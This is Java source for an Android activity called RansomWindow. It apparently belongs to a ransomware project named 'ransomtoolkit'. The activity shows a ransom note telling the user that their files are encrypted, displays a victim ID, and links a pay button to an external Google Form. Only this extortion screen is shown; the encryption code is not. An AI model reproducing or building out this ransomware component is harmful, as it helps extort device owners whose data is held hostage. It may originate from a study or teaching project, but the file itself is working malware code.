package com.asef18766.ransomtoolkit;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.TextView;

public class RansomWindow extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_ransom_window);
        Log.i("UI", "ransom window launched");
        TextView tv = findViewById(R.id.textView);
        tv.setText(String.format("all you files have been encrypted!\n"+
                                 "please fill in the following form\n"+
                                 "with client id:\n"+
                                 "%s",Run.VIC_ID));
        findViewById(R.id.pay_btn).setOnClickListener(new RansomCallBack());
    }
    private class RansomCallBack implements OnClickListener {
        @Override
        public void onClick(View view) {
            Log.i("UI", "triggered");
            startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://forms.gle/xHC3MocTf1F4sdWQ7")));
        }
    }
}